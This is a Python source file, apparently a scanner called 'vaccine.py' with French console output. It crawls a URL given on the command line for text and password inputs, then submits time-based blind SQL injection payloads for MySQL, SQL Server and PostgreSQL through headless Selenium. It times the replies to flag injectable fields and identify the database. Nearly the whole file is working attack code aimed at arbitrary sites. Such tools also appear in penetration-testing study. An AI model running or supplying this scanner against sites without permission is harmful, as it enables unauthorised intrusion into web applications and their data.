import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import UnexpectedAlertPresentException, TimeoutException, NoAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager

# ... (rest of your imports and PAYLOADS dictionary) ...

EXPECTED_DELAY = 5
TOLERANCE = 2
PAYLOADS = {
    "MySQL": f"' AND IF(1=1, SLEEP({EXPECTED_DELAY}), 0) -- ",
    "SQL Server": f"' WAITFOR DELAY '0:0:{EXPECTED_DELAY}' -- ",
    "PostgreSQL": f"' AND pg_sleep({EXPECTED_DELAY}) -- ",
}

class Input_obj:
    def __init__(self, input_line, url):
        self.input_line = input_line
        self.url = url
        
        self.name = None
        self.input_type = None
        
        self.db_type = None
        
        self.input_data(input_line)
        self.identify_db()
        
    def identify_db(self):
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)

        driver.set_page_load_timeout(EXPECTED_DELAY + TOLERANCE + 10) # Increased timeout

        try:
            print(f"Navigation vers : {self.url}")
            driver.get(self.url)
            
            wait = WebDriverWait(driver, 10)
            
            try:
                input_field_initial = wait.until(EC.presence_of_element_located((By.NAME, self.name)))
            except TimeoutException:
                print(f"Timeout: Input field with name '{self.name}' not found on {self.url}")
                driver.quit()
                return

            for db_type, payload in PAYLOADS.items():
                print(f"\n--- Test avec payload pour {db_type} ---")
                print(f"Payload utilisé : '{payload.strip()}'")   
                
                driver.get(self.url)
                
                try:
                    alert = driver.switch_to.alert
                    print(f"Dismissing initial alert: {alert.text}")
                    alert.accept()
                except NoAlertPresentException:
                    pass 

                try:
                    input_field = wait.until(EC.presence_of_element_located((By.NAME, self.name)))
                    
                    start_time = time.time()
                    
                    input_field.send_keys(payload)
                    input_field.send_keys(Keys.RETURN)
                    
                    try:
                        WebDriverWait(driver, 2).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        print(f"Alert Text (after payload): {alert.text}")
                        alert.accept()
                        
                        response_time = time.time() - start_time 
                        print(f"Alert dismissed. Response time adjusted: {response_time:.2f} seconds.")
                        print(f"--> Application displayed an alert, likely not vulnerable to this specific payload for {db_type}.")
                        continue 
                    except TimeoutException:
                        pass 
                    
                    end_time = time.time()
                    response_time = end_time - start_time
                    print(f"Temps de réponse observé : {response_time:.2f} secondes")

                    if response_time >= (EXPECTED_DELAY + TOLERANCE):
                        print(f"--> Potentielle injection SQL basique réussie pour {db_type} ! Le temps de réponse est significativement plus long.")
                        self.db_type = db_type
                         
                    elif response_time >= EXPECTED_DELAY:
                        print(f"--> Le temps de réponse est proche du délai attendu pour {db_type}. Vérifiez les conditions réseau/serveur.")
                    else:
                        print(f"--> Temps de réponse normal. L'application ne semble pas vulnérable à ce payload pour {db_type} ou le payload n'a pas été exécuté.")
                    
                except UnexpectedAlertPresentException as e:
                    print(f"Caught an unexpected alert during payload execution for {db_type}. Error: {e}")
                    try:
                        alert = driver.switch_to.alert
                        print(f"Dismissing the unexpected alert: {alert.text}")
                        alert.accept()
                    except NoAlertPresentException:
                        pass 
                    print(f"--> The test for {db_type} was interrupted by an alert. Re-run or investigate manually.")
                    
                except Exception as e:
                    print(f"Une erreur s'est produite lors de l'envoi du payload ou du chargement de la page : {e}")
                    if "timeout" in str(e).lower():
                        print(f"--> Le chargement de la page a expiré, ce qui pourrait indiquer que le délai du payload pour {db_type} a été respecté.")
                        self.db_type = db_type 

        except Exception as e:
            print(f"Erreur générale : {e}")
        finally:
            driver.quit()

    def input_data(self, input_line):
        from bs4 import BeautifulSoup 
        soup = BeautifulSoup(input_line, 'html.parser')
        input_tag = soup.find('input')
        if input_tag:
            self.name = input_tag.get('name')
            self.input_type = input_tag.get('type')
            
    def __str__(self):
        db_info = f" | DB: [\033[32m{self.db_type}\033[0m]" if self.db_type else ""
        return f"\t\033[96m{self.url}\033[0m |\tname[\033[31m{self.name}\033[0m]\t:\ttype[\033[93m{self.input_type}\033[0m]{db_info}" 

class Crawler:
    def __init__(self, url):
        self.inputs = []
        self.url = url
        self.find_input()
        
    def return_inputs(self):
        return self.inputs    
    
    def parse_input(self, input_elements):
        if input_elements:
            for input_html in input_elements: 
                if '<input type="text"' in input_html or '<input type="password"' in input_html:
                    self.inputs.append(Input_obj(input_html, self.url))
        else:
            print("No input elements found.")
    
    def find_input(self):
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        
        service = Service(ChromeDriverManager().install())
        
        driver = webdriver.Chrome(service=service, options=options)
        
        try:
            driver.get(self.url)
            time.sleep(2)
            
            input_elements = [element.get_attribute('outerHTML') for element in driver.find_elements(By.TAG_NAME, "input")]
            self.parse_input(input_elements)
        except Exception as e:
            print(f"Error finding input elements: {e}")
        finally:
            driver.quit()


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
        crawler = Crawler(target_url)
        found_inputs = crawler.return_inputs()
        
        print(f"\n[+] Found {len(found_inputs)} potential SQLI entry points!")
        for input_obj in found_inputs:
            print(input_obj)
            
    else:
        print("Usage: python3 vaccine.py <URL>")